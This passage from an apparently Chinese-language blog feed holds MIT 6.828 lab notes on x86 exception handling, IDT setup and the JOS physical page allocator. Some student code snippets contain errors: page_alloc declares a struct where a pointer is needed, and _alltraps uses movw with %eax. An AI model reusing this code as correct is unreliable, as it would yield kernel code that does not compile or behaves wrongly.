<h4 id="Exercise_3"><a href="#Exercise_3" class="headerlink" title="Exercise 3"></a>Exercise 3</h4><p>看<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/c09.htm" target="_blank" rel="external">Chapter 9, Exceptions and Interrupts</a></p>
<h4 id="u4FDD_u62A4_u6027_u63A7_u5236_u8F6C_u79FB"><a href="#u4FDD_u62A4_u6027_u63A7_u5236_u8F6C_u79FB" class="headerlink" title="保护性控制转移"></a>保护性控制转移</h4><p>异常和中断都是保护性控制转移，让处理器从用户模式切换到内核模式(CPL=0)，这样用户代码不会对内核或者其他环境造成影响。中断是由外部异步事件导致的处理器保护性控制转移，比如外设I/O的通知信号。异常是正在运行的代码同步事件导致的控制转移，比如除零或者访问无效内存。</p>
<p>为了确保控制转移真的被保护，x86平台上有两种机制：</p>
<ol>
<li><p>中断描述符表。处理器确保中断和异常引起内核进入特定的入口点。</p>
<p> x86允许最多256个不同的中断和异常入口点，每个都有一个独特的中断向量。向量是0到255的数字，中断向量由中断源决定:不同设备，错误条件以及请求内核产生中断的不同向量。CPU使用向量作为索引访问处理器中断描述符表(IDT)，这个是内核在内核私有内存设置的。处理器从合适的入口处加载：</p>
<ul>
<li>加载到EIP寄存器的值，这是个指向处理这种类型异常的内核代码的指针</li>
<li>加载到CS寄存器的值，包含特权级0-1</li>
</ul>
</li>
<li><p>任务状态段。处理器需要存放中断异常发生之前的旧的处理器状态，比如原始EIP值和CS值，这样可以之后还原到之前的状态。保存这个的位置必须要受保护不能随意修改。 </p>
<p> 因此，x86处理器处理中断时会导致特权级由用户转为内核，也会将堆切换到内核内存中。任务状态段具体指明段选择子和堆栈的地址。处理器将SS, ESP, EFLAGS, CS, EIP和可选错误码压入堆栈中，之后从中断描述符中加载CS和EIP，设置ESP和SS指向新的堆栈。</p>
</li>
</ol>
<h4 id="u5F02_u5E38_u548C_u4E2D_u65AD_u7684_u7C7B_u578B"><a href="#u5F02_u5E38_u548C_u4E2D_u65AD_u7684_u7C7B_u578B" class="headerlink" title="异常和中断的类型"></a>异常和中断的类型</h4><p>所用同步异常使用的中断向量在0到31，因此映射到IDT入口0-31。比如页错误导致的异常是向量14。大于31的中断向量通常是软件中断，是由int指令产生，或者外设产生硬件中断。</p>
<h5 id="u4F8B_u5B50"><a href="#u4F8B_u5B50" class="headerlink" title="例子"></a>例子</h5><p>举个例子，处理器执行代码遇到了除零问题。</p>
<ol>
<li>处理器切换到TSS的SS0和ESP0字段定义的堆栈，JOS中这两个字段是 GD_KD 和 KSTACKTOP。</li>
<li><p>处理器将异常参数压入内核堆栈，放在KSTACKTOP：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">+--------------------+ KSTACKTOP             </div><div class="line">| 0x00000 | old SS   |     &quot; - 4</div><div class="line">|      old ESP       |     &quot; - 8</div><div class="line">|     old EFLAGS     |     &quot; - 12</div><div class="line">| 0x00000 | old CS   |     &quot; - 16</div><div class="line">|      old EIP       |     &quot; - 20 &lt;---- ESP </div><div class="line">+--------------------+</div></pre></td></tr></table></figure>
</li>
<li><p>处理除法问题，其中断向量在x86上是0，处理器读取IDT的第0项，设置CS:EIP指向中断处理函数的地址。</p>
</li>
<li>处理函数负责处理异常，比如终止用户环境。</li>
</ol>
<p>对于确定类型的x86异常，除了上面五个还有一个错误码。比如常见的页错误异常是数字14。80386手册上有详细定义的错误码。当处理器压入错误码，堆栈的样子是这样的:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">+--------------------+ KSTACKTOP             </div><div class="line">| 0x00000 | old SS   |     &quot; - 4</div><div class="line">|      old ESP       |     &quot; - 8</div><div class="line">|     old EFLAGS     |     &quot; - 12</div><div class="line">| 0x00000 | old CS   |     &quot; - 16</div><div class="line">|      old EIP       |     &quot; - 20</div><div class="line">|     error code     |     &quot; - 24 &lt;---- ESP</div><div class="line">+--------------------+</div></pre></td></tr></table></figure></p>
<h5 id="u5F02_u5E38_u4E2D_u65AD_u5D4C_u5957"><a href="#u5F02_u5E38_u4E2D_u65AD_u5D4C_u5957" class="headerlink" title="异常中断嵌套"></a>异常中断嵌套</h5><p>处理器在内核模式和用户模式都可以处理异常和中断。仅当从内核切换到用户时，x86处理器自动切换堆栈，将寄存器之前的值保存到堆栈上，然后触发异常处理。如果处理器已处于内核模式就触发了中断或异常(也就是CS寄存器低两位为0)，然后CPU压入内核堆栈更多值。这样就可以处理嵌套中断。如果处理器已经在内核模式且正在处理嵌套异常，就不会保存SS和ESP寄存器，所以内核堆栈就像这样：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">+--------------------+ &lt;---- old ESP</div><div class="line">|     old EFLAGS     |     &quot; - 4</div><div class="line">| 0x00000 | old CS   |     &quot; - 8</div><div class="line">|      old EIP       |     &quot; - 12</div><div class="line">+--------------------+</div></pre></td></tr></table></figure></p>
<p>如果处理器在内核模式处理异常，因为一些原因比如堆栈空间不足，不能将旧的状态信息压入堆栈，那么处理器之后就不能恢复，只能重启。当然，内核肯定被要设计成不能发生这种事情。</p>
<h5 id="u8BBE_u7F6EIDT"><a href="#u8BBE_u7F6EIDT" class="headerlink" title="设置IDT"></a>设置IDT</h5><p>所以现在需要去设置IDT，这样JOS才能处理异常。现在只需要设置处理中断向量0-31(处理器异常)。</p>
<p>头文件 <code>inc/trap.h</code>和 <code>kern/trap.h</code> 包含了中断和异常的相关定义。后者包含了仅内核可访问的定义，前者是用户模式也能访问。</p>
<p>最终要实现这个样子:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">      IDT                   trapentry.S         trap.c</div><div class="line">   </div><div class="line">+----------------+                        </div><div class="line">|   &amp;handler1    |---------&gt; handler1:          trap (struct Trapframe *tf)</div><div class="line">|                |             // do stuff      &#123;</div><div class="line">|                |             call trap          // handle the exception/interrupt</div><div class="line">|                |             // ...           &#125;</div><div class="line">+----------------+</div><div class="line">|   &amp;handler2    |--------&gt; handler2:</div><div class="line">|                |            // do stuff</div><div class="line">|                |            call trap</div><div class="line">|                |            // ...</div><div class="line">+----------------+</div><div class="line">       .</div><div class="line">       .</div><div class="line">       .</div><div class="line">+----------------+</div><div class="line">|   &amp;handlerX    |--------&gt; handlerX:</div><div class="line">|                |             // do stuff</div><div class="line">|                |             call trap</div><div class="line">|                |             // ...</div><div class="line">+----------------+</div></pre></td></tr></table></figure>
<p>每个异常或中断都应该在 <code>trapentry.S</code> 有自己的处理函数，trap_init() 用来初始化IDT。每个异常处理是一个保存在堆栈上的 struct Trapframe ，调用 trap() 指向这个 Trapframe。trap() 之后处理异常中断。</p>
<h4 id="Exercise_4"><a href="#Exercise_4" class="headerlink" title="Exercise 4"></a>Exercise 4</h4><p>实现上面说的异常处理，需要在 trapentry.S 给每个 trap 添加入口点。</p>
<p>_alltraps 应该是这个样子的：</p>
<ol>
<li>值压入堆栈使其像一个 Trapframe 结构体</li>
<li>加载 GD_KD 到 %ds 和 %es</li>
<li>pushl %esp 将指向 Trapframe 的指针作为 trap() 的参数</li>
<li>调用 trap</li>
</ol>
<p>考虑使用 pushal 指令。最后使用 <code>make grade</code> 应该对于 divzero, softint, badsegment 这几个测试点正常通过。</p>
<p>参考<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/s09_10.htm" target="_blank" rel="external">80386 Programmer’s Manual 9.10 Error Code Summary</a></p>
<p><img src="1.png" alt=""></p>
<p>由上面的中断类型，确定哪些是不需要压入错误码</p>
<p>其中， <code>trapentry.S</code> 修改为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">/*</div><div class="line"> * Lab 3: Your code here for generating entry points for the different traps.</div><div class="line"> */</div><div class="line">TRAPHANDLER_NOEC(t_divide, T_DIVIDE)	// 0</div><div class="line">TRAPHANDLER_NOEC(t_debug, T_DEBUG)		// 1</div><div class="line">TRAPHANDLER_NOEC(t_nmi, T_NMI)			// 2</div><div class="line">TRAPHANDLER_NOEC(t_brkpt, T_BRKPT)		// 3</div><div class="line">TRAPHANDLER_NOEC(t_oflow, T_OFLOW)		// 4</div><div class="line">TRAPHANDLER_NOEC(t_bound, T_BOUND)		// 5</div><div class="line">TRAPHANDLER_NOEC(t_illop, T_ILLOP)		// 6</div><div class="line">TRAPHANDLER_NOEC(t_device, T_DEVICE)	// 7</div><div class="line">TRAPHANDLER(t_dblflt, T_DBLFLT)			// 8</div><div class="line">										// 9</div><div class="line">TRAPHANDLER(t_tss, T_TSS)				// 10</div><div class="line">TRAPHANDLER(t_segnp, T_SEGNP)			// 11</div><div class="line">TRAPHANDLER(t_stack, T_STACK)			// 12</div><div class="line">TRAPHANDLER(t_gpflt, T_GPFLT)			// 13</div><div class="line">TRAPHANDLER(t_pgflt, T_PGFLT)			// 14</div><div class="line">										// 15</div><div class="line">TRAPHANDLER_NOEC(t_fperr, T_FPERR)		// 16</div><div class="line">TRAPHANDLER(t_align, T_ALIGN)			// 17</div><div class="line">TRAPHANDLER_NOEC(t_mchk, T_MCHK)		// 18</div><div class="line">TRAPHANDLER_NOEC(t_simderr, T_SIMDERR)	// 19</div><div class="line"></div><div class="line">TRAPHANDLER_NOEC(t_syscall, T_SYSCALL)</div><div class="line"></div><div class="line">/*</div><div class="line"> * Lab 3: Your code here for _alltraps</div><div class="line"> */</div><div class="line">_alltraps:</div><div class="line">	pushl %ds</div><div class="line">	pushl %es</div><div class="line">	pushal</div><div class="line"></div><div class="line">	movw $GD_KD, %eax</div><div class="line">	movw %ax, %ds</div><div class="line">	movw %ax, %es</div><div class="line"></div><div class="line">	pushl %esp</div><div class="line">	call trap</div></pre></td></tr></table></figure>
<p><code>trap.c</code> 中首先完成 trap_init()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">void</div><div class="line">trap_init(void)</div><div class="line">&#123;</div><div class="line">	extern struct Segdesc gdt[];</div><div class="line"></div><div class="line">	// LAB 3: Your code here.</div><div class="line">	void t_divide();</div><div class="line">	void t_debug();</div><div class="line">	void t_nmi();</div><div class="line">	void t_brkpt();</div><div class="line">	void t_oflow();</div><div class="line">	void t_bound();</div><div class="line">	void t_illop();</div><div class="line">	void t_device();</div><div class="line">	void t_dblflt();</div><div class="line">	void t_tss();</div><div class="line">	void t_segnp();</div><div class="line">	void t_stack();</div><div class="line">	void t_gpflt();</div><div class="line">	void t_pgflt();</div><div class="line">	void t_fperr();</div><div class="line">	void t_align();</div><div class="line">	void t_mchk();</div><div class="line">	void t_simderr();</div><div class="line">	void t_syscall();</div><div class="line">	SETGATE(idt[T_DIVIDE], 0, GD_KT, t_divide, 0);</div><div class="line">	SETGATE(idt[T_DEBUG], 0, GD_KT, t_debug, 0);</div><div class="line">	SETGATE(idt[T_NMI], 0, GD_KT, t_nmi, 0);</div><div class="line">	SETGATE(idt[T_BRKPT], 0, GD_KT, t_brkpt, 3);</div><div class="line">	SETGATE(idt[T_OFLOW], 0, GD_KT, t_oflow, 0);</div><div class="line">	SETGATE(idt[T_BOUND], 0, GD_KT, t_bound, 0);</div><div class="line">	SETGATE(idt[T_ILLOP], 0, GD_KT, t_illop, 0);</div><div class="line">	SETGATE(idt[T_DEVICE], 0, GD_KT, t_device, 0);</div><div class="line">	SETGATE(idt[T_DBLFLT], 0, GD_KT, t_dblflt, 0);</div><div class="line">	SETGATE(idt[T_TSS], 0, GD_KT, t_tss, 0);</div><div class="line">	SETGATE(idt[T_SEGNP], 0, GD_KT, t_segnp, 0);</div><div class="line">	SETGATE(idt[T_STACK], 0, GD_KT, t_stack, 0);</div><div class="line">	SETGATE(idt[T_GPFLT], 0, GD_KT, t_gpflt, 0);</div><div class="line">	SETGATE(idt[T_PGFLT], 0, GD_KT, t_pgflt, 0);</div><div class="line">	SETGATE(idt[T_FPERR], 0, GD_KT, t_fperr, 0);</div><div class="line">	SETGATE(idt[T_ALIGN], 0, GD_KT, t_align, 0);</div><div class="line">	SETGATE(idt[T_MCHK], 0, GD_KT, t_mchk, 0);</div><div class="line">	SETGATE(idt[T_SIMDERR], 0, GD_KT, t_simderr, 0);</div><div class="line">	SETGATE(idt[T_SYSCALL], 0, GD_KT, t_syscall, 3);</div><div class="line">	// Per-CPU setup </div><div class="line">	trap_init_percpu();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h3 id="Part_B_3A__u7F3A_u9875_uFF0C_u65AD_u70B9_u5F02_u5E38_u548C_u7CFB_u7EDF_u8C03_u7528"><a href="#Part_B_3A__u7F3A_u9875_uFF0C_u65AD_u70B9_u5F02_u5E38_u548C_u7CFB_u7EDF_u8C03_u7528" class="headerlink" title="Part B: 缺页，断点异常和系统调用"></a>Part B: 缺页，断点异常和系统调用</h3><h4 id="u5904_u7406_u7F3A_u9875_u5F02_u5E38"><a href="#u5904_u7406_u7F3A_u9875_u5F02_u5E38" class="headerlink" title="处理缺页异常"></a>处理缺页异常</h4><p>缺页异常，也就是中断向量 14 (T_PGFLT)，是一个常见的重要异常。当处理器产生缺页，会将线性(也就是虚拟)地址储存在控制寄存器 CR2。</p>
<h4 id="Exercise_5"><a href="#Exercise_5" class="headerlink" title="Exercise 5"></a>Exercise 5</h4><p>修改 trap_dispatch() 使系统将缺页异常传到 page_fault_handler()。完成以后 <code>make grade</code> 应该成功通过faultread, faultreadkernel, faultwrite, faultwritekernel。</p>
<p>查看 <code>inc/trap.h</code> 可以知道 Trapframe 结构体中 tf_trapno 代表中断向量的序号。因此只要判断这个是不是缺页中断就可以了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">static void</div><div class="line">trap_dispatch(struct Trapframe *tf)</div><div class="line">&#123;</div><div class="line">	// Handle processor exceptions.</div><div class="line">	// LAB 3: Your code here.</div><div class="line">	if (tf-&gt;tf_trapno == T_PGFLT) &#123;</div><div class="line">		page_fault_handler(tf);</div><div class="line">		return ;</div><div class="line">	&#125;</div><div class="line">	// Unexpected trap: The user process or the kernel has a bug.</div><div class="line">	print_trapframe(tf);</div><div class="line">	if (tf-&gt;tf_cs == GD_KT)</div><div class="line">		panic(&quot;unhandled trap in kernel&quot;);</div><div class="line">	else &#123;</div><div class="line">		env_destroy(curenv);</div><div class="line">		return;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当然，这个函数之后还需要完善。</p>
<h4 id="u65AD_u70B9_u5F02_u5E38"><a href="#u65AD_u70B9_u5F02_u5E38" class="headerlink" title="断点异常"></a>断点异常</h4>]]></content>
    
    <summary type="html">
    
      MIT6.828
    
    </summary>
    
    
      <category term="MIT6.828" scheme="http://xinqiu.me/tags/MIT6-828/"/>
    
  </entry>
  
  <entry>
    <title>MIT 6.828 Lab 2</title>
    <link href="http://xinqiu.me/2016/12/09/MIT-6.828-2/"/>
    <id>http://xinqiu.me/2016/12/09/MIT-6.828-2/</id>
    <published>2016-12-08T16:00:00.000Z</published>
    <updated>2017-02-02T09:15:05.000Z</updated>
    
    <content type="html"><![CDATA[<p>继续开始Lab2，这部分内容可以回忆以前的CSAPP的malloc lab.</p>
<a id="more"></a>
<h2 id="u5E8F_u8A00"><a href="#u5E8F_u8A00" class="headerlink" title="序言"></a>序言</h2><p>这个实验要实现内存管理。内存管理有两个部分，第一部分是给内核分配物理内存，内存分配是以4096 bytes为一个单位，也就是页。第二部分是虚拟内存的管理，关于物理内存和虚拟内存的映射。</p>
<p>Lab 2 添加了以下文件:</p>
<ul>
<li>inc/memlayout.h</li>
<li>kern/pmap.c</li>
<li>kern/pmap.h</li>
<li>kern/kclock.h</li>
<li>kern/kclock.c</li>
</ul>
<p>memlayout.h 描述了虚拟地址空间的结构，通过修改pmap.c. memlayout.h 和 pmap.h<br>来实现PageInfo结构，这个是为了记录哪些物理内存的page是空闲的。kclock.c 和 kclock.h 管理PC的时钟和CMOS RAM硬件，这个设备记录了物理内存的数量。pmap.c需要读这个设备来确定内存大小。</p>
<h2 id="Part_1_3A__u7269_u7406_u9875_u7BA1_u7406"><a href="#Part_1_3A__u7269_u7406_u9875_u7BA1_u7406" class="headerlink" title="Part 1: 物理页管理"></a>Part 1: 物理页管理</h2><h3 id="u7269_u7406_u9875"><a href="#u7269_u7406_u9875" class="headerlink" title="物理页"></a>物理页</h3><p>操作系统需要记录物理RAM哪部分是空闲的哪部分在用。JOS使用page granularity来管理物理内存，因此可是用MMU来映射和保护每一块分配的内存。</p>
<p>以下内容要配上 <code>inc/memlayout.h</code> 的图。</p>
<p><img src="1.png" alt=""></p>
<h4 id="Exercise_1"><a href="#Exercise_1" class="headerlink" title="Exercise 1"></a>Exercise 1</h4><p>实现kern/pmap.c中的函数.</p>
<ul>
<li>boot_alloc()</li>
<li>mem_init() (only up to the call to check_page_free_list(1))</li>
<li>page_init()</li>
<li>page_alloc()</li>
<li>page_free()</li>
</ul>
<p>首先看通过查看 mem_init 函数可以知道，boot_alloc 是用来初始化页目录(page directory)。在 boot_alloc 中，nextfree 为下一个空闲内存的虚拟内存地址，当 nextfree 为空时会先初始化。用到了ROUNDUP，这个ROUNDUP在 <code>/inc/types.h</code> 中，因为内存区块是对齐的，所以每块都是固定的大小。npages 是页数量，可使用的内存大小是 npages × PGSIZE ，根据lab1提到的，KERNBASE是分配内存的起始地址，若nextfree 大于 KERNBASE + npages × PGSIZE 的值，就是指针地址溢出了。</p>
<p>所以只需要添加上这部分代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">result = nextfree;</div><div class="line">nextfree = ROUNDUP(nextfree+n, PGSIZE);</div><div class="line"><span class="keyword">if</span>((<span class="keyword">uint32_t</span>)nextfree &gt; KERNBASE + (npages * PGSIZE)) &#123;</div><div class="line">    panic(<span class="string">"Out of memory!\n"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>mem_init 在执行完上面的函数以后，会给kern_pgdir加上权限位。</p>
<p>之后就是要初始化所有的struct PageInfo 为 0。首先确定PageInfo的大小，然后用boot_alloc分配内存，接着用memset初始化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">size_t</span> PageInfo_size = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> PageInfo);</div><div class="line">pages = (<span class="keyword">struct</span> PageInfo *)boot_alloc(npages * PageInfo_size);</div><div class="line"><span class="built_in">memset</span>(pages, <span class="number">0</span>, npages * PageInfo_size);</div></pre></td></tr></table></figure>
<p>接着调用page_init()来初始化page结构和内存空闲链表。</p>
<p>参考注释，一步步修改就可以了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">page_init</span><span class="params">(<span class="keyword">void</span>)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// The example code here marks all physical pages as free.</span></div><div class="line">	<span class="comment">// However this is not truly the case.  What memory is free?</span></div><div class="line">	<span class="comment">//  1) Mark physical page 0 as in use.</span></div><div class="line">	<span class="comment">//     This way we preserve the real-mode IDT and BIOS structures</span></div><div class="line">	<span class="comment">//     in case we ever need them.  (Currently we don't, but...)</span></div><div class="line">	<span class="comment">//  2) The rest of base memory, [PGSIZE, npages_basemem * PGSIZE)</span></div><div class="line">	<span class="comment">//     is free.</span></div><div class="line">	<span class="comment">//  3) Then comes the IO hole [IOPHYSMEM, EXTPHYSMEM), which must</span></div><div class="line">	<span class="comment">//     never be allocated.</span></div><div class="line">	<span class="comment">//  4) Then extended memory [EXTPHYSMEM, ...).</span></div><div class="line">	<span class="comment">//     Some of it is in use, some is free. Where is the kernel</span></div><div class="line">	<span class="comment">//     in physical memory?  Which pages are already in use for</span></div><div class="line">	<span class="comment">//     page tables and other data structures?</span></div><div class="line">	<span class="comment">//</span></div><div class="line">	<span class="comment">// Change the code to reflect this.</span></div><div class="line">	<span class="comment">// NB: DO NOT actually touch the physical memory corresponding to</span></div><div class="line">	<span class="comment">// free pages!</span></div><div class="line">	<span class="keyword">size_t</span> i;</div><div class="line">    page_free_list = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; npages; i++) &#123;</div><div class="line">        <span class="keyword">if</span> (i == <span class="number">0</span>) &#123;</div><div class="line">            pages[i].pp_ref = <span class="number">0</span>;</div><div class="line">            pages[i].pp_link = <span class="literal">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &lt; npages_basemem)&#123;</div><div class="line">            pages[i].pp_ref = <span class="number">0</span>;</div><div class="line">            pages[i].pp_link = page_free_list;</div><div class="line">            page_free_list = &amp;pages[i];</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &gt;= IOPHYSMEM/PGSIZE &amp;&amp; i &lt; EXTPHYSMEM/PGSIZE) &#123;</div><div class="line">            pages[i].pp_ref = <span class="number">1</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i &lt;= EXTPHYSMEM/PGSIZE || i &lt; PADDR(boot_alloc(<span class="number">0</span>))/PGSIZE)&#123;</div><div class="line">            pages[i].pp_ref++;</div><div class="line">            pages[i].pp_link = <span class="literal">NULL</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> &#123;</div><div class="line">            pages[i].pp_ref = <span class="number">0</span>;</div><div class="line">            pages[i].pp_link = page_free_list;</div><div class="line">            page_free_list = &amp;pages[i];</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>之后需要实现page_alloc函数。这个函数是为了分配一个物理页， 返回对应的结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">struct</span> PageInfo *</span></div><div class="line"><span class="title">page_alloc</span><span class="params">(<span class="keyword">int</span> alloc_flags)</span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">struct</span> PageInfo result;</div><div class="line">    <span class="keyword">if</span> (!page_free_list)</div><div class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">    result = page_free_list;</div><div class="line">    page_free_list = page_free_list-&gt;pp_link;</div><div class="line"></div><div class="line">    result-&gt;pp_link = <span class="literal">NULL</span>;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (alloc_flags &amp; ALLOC_ZERO) &#123;</div><div class="line">        <span class="built_in">memset</span>(page2kva(result), <span class="number">0</span>, PGSIZE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>最后是实现page_free。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">void</span></span></div><div class="line"><span class="title">page_free</span><span class="params">(<span class="keyword">struct</span> PageInfo *pp)</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">// Fill this function in</span></div><div class="line">	<span class="comment">// Hint: You may want to panic if pp-&gt;pp_ref is nonzero or</span></div><div class="line">	<span class="comment">// pp-&gt;pp_link is not NULL.</span></div><div class="line">    assert(pp-&gt;pp_ref == <span class="number">0</span>);</div><div class="line">    assert(pp-&gt;pp_link == <span class="literal">NULL</span>);</div><div class="line"></div><div class="line">    pp-&gt;pp_link = page_free_list;</div><div class="line">    page_free_list = pp;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="Part_2_3A__u865A_u62DF_u5185_u5B58"><a href="#Part_2_3A__u865A_u62DF_u5185_u5B58" class="headerlink" title="Part 2: 虚拟内存"></a>Part 2: 虚拟内存</h2><h3 id="u865A_u62DF_u5185_u5B58"><a href="#u865A_u62DF_u5185_u5B58" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><h4 id="Exercise_2"><a href="#Exercise_2" class="headerlink" title="Exercise 2"></a>Exercise 2</h4><p>熟悉关于分页地址转换(page translation)和基于页的保护(page-based protection)。</p>
<p>首先介绍一下80386将逻辑地址转为物理地址的方法。</p>
<ul>
<li>分段地址转换，由段选择子和段偏移量构成的逻辑地址转为线性地址。</li>
<li>分页地址转换，线性地址转为物理地址。</li>
</ul>
<p><img src="https://pdos.csail.mit.edu/6.828/2016/readings/i386/fig5-1.gif" alt=""></p>
<p>关于页转换段保护之类的还是查看<a href="https://pdos.csail.mit.edu/6.828/2016/readings/i386/toc.htm" target="_blank" rel="external">Intel 80386 Reference Manual</a>.</p>
<h3 id="u865A_u62DF_u5730_u5740_uFF0C_u7EBF_u6027_u5730_u5740_uFF0C_u7269_u7406_u5730_u5740"><a href="#u865A_u62DF_u5730_u5740_uFF0C_u7EBF_u6027_u5730_u5740_uFF0C_u7269_u7406_u5730_u5740" class="headerlink" title="虚拟地址，线性地址，物理地址"></a>虚拟地址，线性地址，物理地址</h3><p>虚拟地址是有段选择子和段偏移构成。线性地址是经过分段地址转换单没进行分页地址转换。物理地址是两种转换之后最终通过硬件总线到RAM的地址。</p>
